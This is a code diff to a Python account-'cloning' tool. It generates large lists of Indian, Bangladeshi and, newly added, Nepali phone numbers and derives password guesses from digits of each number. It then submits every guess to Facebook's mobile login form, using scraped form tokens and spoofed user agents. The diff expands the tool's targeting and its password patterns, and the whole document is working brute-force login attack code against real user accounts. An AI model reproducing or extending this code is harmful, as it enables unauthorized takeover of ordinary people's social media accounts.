@@ -783,6 +783,7 @@ def ran():
     sort.logo()
     print("[b]    [red1][A] [sea_green2]IND Number Clone")
     print("[b]    [red1][B] [spring_green1]BD Number Clone")
+    print("[b]    [red1][C] [spring_green1]NEPAL Number Clone")
     print(sort.line())
     ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m -> \x1b[38;0;196m ")
     if ask in ["1", "01", "a", "A"]:
@@ -799,7 +800,7 @@ def ran():
         for i in range(limit):
             data = str(int(code) + i)
             user.append(data)
-    else:
+    elif ask in ["2", "02", "b", "B"]:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]Type A BD 11 Digit Number  [orange3]▶  [chartreuse1]01710185019")
@@ -814,6 +815,21 @@ def ran():
         for i in range(limit):
             data = str(int(code) + i)
             user.append(data)
+    else:
+        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]NEPAL Number")
+        print(sort.line())
+        print("[b]     [red1]✗ [chartreuse1]Type A Sim CODE [orange3]▶  [chartreuse1]9828 9815 9813 9818 9819")
+        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
+        print(sort.line())
+        print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
+        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
+        print(sort.line())
+        for mbr in range(limit):
+            nmp = ''.join(random.choice(string.digits) for _ in range(7))
+            user.append(nmp)
+
+
+
     passlimit = input("Password Limit -> ")
     print(sort.line())
     for i in range(int(passlimit)):
@@ -854,8 +870,10 @@ def ran():
         for xd in user:
             if ask in ["1", "01", "a", "A"]:
                 uid = "91" + xd
-            else:
+            elif ask in ["2", "02", "b", "B"]:
                 uid = "0" + xd
+            else:
+                uid = code + xd
             
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
@@ -871,7 +889,8 @@ def ren_sub(uid, pwx, meth, user, fb):
     try:
         for pw in pwx:
             ps = pw.replace("first8", uid[:8]).replace("last8",uid[-8:] ).replace("last11", uid[:11]).replace(
-                "first11", uid[:11]).replace("first6",uid[:6] ).replace("last6", uid[-6:])
+                "first11", uid[:11]).replace("first6",uid[:6] ).replace("last6", uid[-6:]).replace("first7", uid[:7]).replace(
+                "last7",uid[-7:] ).replace("first9", uid[:9]).replace("last9",uid[-9:] ).replace("first10", uid[:10]).replace("last10",uid[-10:] )
                 
             free_fb = session.get(f'https://{fb}.facebook.com').text
             info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -879,7 +898,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = uaxxxx()
+            uax = uagent
             
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
